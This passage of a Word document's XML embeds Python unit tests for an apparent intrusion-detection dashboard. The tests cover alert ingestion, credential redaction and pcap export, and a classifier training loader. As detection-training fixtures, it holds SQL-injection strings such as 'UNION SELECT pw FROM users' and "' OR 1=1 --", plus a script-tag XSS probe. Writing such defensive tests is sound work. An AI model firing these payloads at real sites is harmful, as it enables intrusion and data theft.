    <w:p w14:paraId="13F9D7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"ts": time.time(), "time": packet_store.now_hms(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C424B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 pkt["src"], "dst": pkt["dst"], "proto": pkt["proto"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C178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"sport": pkt["sport"], "dport": pkt["dport"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3C194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"length": pkt["length"], "info": pkt["info"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22A2FC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"verdict": "clean", "hex": frame.hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CF0B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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE63AE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packet_store.STORE.update_stats(120, 11.5, 4.2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416F387D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62D6FB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send structured JSON alerts over the wire (FR-5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C7D893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sender = logger_mod.UDPSender("127.0.0.1", 9999)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2706153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sender.send_log("MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F69B4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src_ip="192.0.2.66", confidence=0.99,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05416F6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payload=b"id=1 UNION SELECT pw FROM users")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A5C846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sender.send_log("DDoS DETECTED! Z-Score: 5.10 (PPS: 9000)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A4F910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src_ip="10.0.0.9", confidence=0.9)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="297A67F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sender.send_log("PORT SCAN DETECTED! (Unique Ports: 210/sec)",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F36D0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src_ip="192.0.2.5", confidence=0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30ABBB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time.sleep(1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="474DC242" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D22493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test_stats_endpoint_reports_live_traffic(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775F00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stats = _get_json("/api/stats")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12A6A3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self.assertEqual(stats["pps"], 120)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DDF49C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self.assertAlmostEqual(stats["z_score"], 4.2, places=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A1F04C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self.assertFalse(stats["ddos_candidate"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330829A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self.assertFalse(stats["ddos_active"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B33BFB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self.assertGreaterEqual(stats["packets_buffered"], 7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B4DCE1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self.assertGreaterEqual(stats["proto_counts"]["TCP"], 5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E7BA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self.assertGreaterEqual(stats["proto_counts"]["ICMP"], 1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF8BC2D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1757E8E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test_dashboard_is_utf8_without_broken_symbols(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="228EEE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urllib.request.urlopen(BASE + "/", timeout=5) as response:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="607235A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self.assertEqual(response.headers.get_content_charset(), "utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1881ED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body = response.read().decode("utf-8")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B79EA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self.assertNotIn("â", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F17EC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self.assertNotIn("</w:t>
      </w:r>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Symbol" w:eastAsia="Consolas" w:hAnsi="Segoe UI Symbol" w:cs="Segoe UI Symbol"/>
        </w:rPr>
        <w:t>⭳</w:t>
      </w:r>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Consolas" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DA9A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self.assertIn("Export .pcap (Wireshark)", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="246C4380" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="686653F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test_json_alerts_are_ingested_with_attack_context(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38AF71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stats = _get_json("/api/stats")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB2C3C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self.assertGreaterEqual(stats["total_alerts"], 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0E717B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B2445A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techniques = {a.get("technique_id") for a in stats["alerts"]}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199062C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self.assertIn("T1190", techniques)   # payload  -&gt; Initial Access</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5329F04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self.assertIn("T1498", techniques)   # flood    -&gt; Impact</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF32C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self.assertIn("T1046", techniques)   # scan     -&gt; Discovery</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF4B0DF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F3221E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match on source address rather than position: other tests in this</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614B219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class also emit T1190 alerts, and execution order is alphabetical</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5457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payload_alert = next(a for a in stats["alerts"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30B550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a.get("src_ip") == "192.0.2.66")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E052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self.assertEqual(payload_alert["technique_id"], "T1190")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C2DB7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self.assertEqual(payload_alert["severity"], "HIGH")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6B6A7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self.assertGreater(payload_alert["risk_score"], 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDFE3BF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B30D6A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test_credentials_never_reach_the_dashboard(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BA87E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the excerpt forwarded over UDP must already be redacted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A16EFB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sender = logger_mod.UDPSender("127.0.0.1", 9999)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF6679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sender.send_log("MALICIOUS PAYLOAD! Keywords: ['UNION']",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F0E33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src_ip="192.0.2.7", confidence=0.95,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B49D3C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payload=b"password=hunter2&amp;email=bob@example.com UNION")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A4D68F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time.sleep(0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C145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body = json.dumps(_get_json("/api/stats"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F87503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self.assertNotIn("hunter2", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="351E61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self.assertNotIn("bob@example.com", body)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6993D76B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67BC08B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test_attack_technique_rollup(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A78D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stats = _get_json("/api/stats")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF6ECB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self.assertTrue(stats["top_techniques"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E36D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self.assertGreater(stats["max_risk"], 0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63FE5586" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F23E9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test_malformed_datagram_is_rejected_not_crashing(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCB05B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port 9999 is itself a scan target, so raw bytes do arrive</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA7730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 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F4D8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s.sendto(b"\x00\x01\x02\xff\xfe not json at all", ("127.0.0.1", 9999))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4015B0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s.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B23F8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time.sleep(0.8)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF2E61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stats = _get_json("/api/stats")   # server must still be responsive</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7149C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self.assertIn("INVALID UDP PAYLOAD",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67295B0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json.dumps(stats["alerts"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3896B4E6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08A6B7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test_packets_endpoint_returns_decoded_rows(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EE2D15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data = _get_json("/api/packets?limit=50")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E865CC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self.assertGreaterEqual(len(data["packets"]), 7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A264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row = data["packets"][0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68041D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key in ("src", "dst", "proto", "length", "info", "hex"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F0299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self.assertIn(key, row)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187913E6" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77FD2A4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test_protocol_filter(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="464CF0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icmp = _get_json("/api/packets?limit=50&amp;proto=ICMP")["packets"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A6DDE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self.assertTrue(icmp)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9C459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self.assertTrue(all(p["proto"] == "ICMP" for p in icmp))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42271EDB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="71D77F6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test_config_endpoint_exposes_effective_policy(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733FE6C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cfg = _get_json("/api/config")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7584BE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NFR-3 defaults must be visible and safe</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008751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self.assertFalse(cfg["block_enabled"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6257D8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self.assertTrue(cfg["privacy_mode"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0BA90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self.assertEqual(cfg["payload_excerpt_bytes"], 64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D616A6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self.assertEqual(cfg["ddos_min_pps"], 500)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3CF0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self.assertEqual(cfg["ddos_consecutive_intervals"], 3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EFB9F4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78BD7D4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test_pcap_export_is_openable_by_wireshark(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187D3E5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urllib.request.urlopen(BASE + "/api/export.pcap", timeout=5) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CCF57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self.assertEqual(r.headers.get("Content-type"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CF1544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"application/vnd.tcpdump.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="413B32A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raw = r.read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="171260F2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="371DF39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path = os.path.join(HERE, "_siem_export.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1315B8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434F054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open(path, "wb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498A5CC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f.write(raw)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C16B614" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E5411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reader = pcap.PcapReader(path)          # validates the magic number</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2C8B1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self.assertEqual(reader.linktype, pcap.LINKTYPE_ETHERNET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E0AFC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recovered = list(reader)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC3FE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reader.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FA9D25" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="416B995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self.assertGreaterEqual(len(recovered), 7)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E7679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each exported frame must decode back into a real packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637EE24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parser = parser_mod.PacketParser()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BB9B6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_ts, data, _orig in recovered:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5944AD0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self.assertIsNotNone(parser.parse(data))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AAFE39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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BB6B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os.path.exists(path):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192758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os.remove(path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15775F4E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F8FFECB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="722E61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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786CB3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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D237E9F"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src/tests/test_training_and_eval.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BD8489" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>150 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62924F7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tests for the training + evaluation pipelines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21FF5DF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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC405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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670D170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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C38FAC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tempfile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FA58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import unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F1297D1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5756F3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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC8A01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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B342D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SRC not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C18F95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sys.path.insert(0, SRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65217AE1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5073FDA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from evaluation import evaluate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CD6C9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from training import loader, train</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26FA7208" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70F5540D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0EA66AF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KNN_CSV = """unique_ports,packet_count,label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2161488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1,5,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2897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2,8,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C41FFA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3,12,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AFA76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50,60,Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759B20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100,200,Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B445FA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500,1000,Scan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69169E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23C1DE82" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F81F23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PAYLOAD_CSV = """payload,label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17365C1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GET /index.html,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B786B2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GET /about,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B273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GET /home HTTP/1.1,Normal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F2D90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GET /?id=1 UNION SELECT,Malicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="547D08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GET /?u=admin' OR 1=1 --,Malicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC9AA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GET /search?q=&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;,Malicious</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A0B9C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4B03662D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C739B3F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A17A3F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def _tmp_csv(text):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FB14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 = tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564F3CE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f.write(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38E178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f.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC5E7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 f.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F3FAC63" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18C50093" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58B3BA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TestLoader(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01F85C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test_knn_loader(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300941A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 = _tmp_csv(KNN_CSV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2787F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7D9814B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rows = loader.load_knn_csv(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5F0E8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self.assertEqual(len(rows), 6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBD93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self.assertEqual(rows[0][2], "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C43D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self.assertEqual(rows[-1][2], "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0181DA2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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D99BC4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os.unlink(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD850D9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2EA2799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def test_payload_loader(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A203B4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 = _tmp_csv(PAYLOAD_CSV)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="318ED1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4F19829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rows = loader.load_payload_csv(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B2B0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self.assertEqual(len(rows), 6)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023CE2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self.assertSetEqual({l for _, l in rows},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74CD2D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{"Normal", "Malicious"})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5AF44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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="025AA42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os.unlink(p)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A58744F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E72FC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test_missing_columns_raises(self):</w:t>
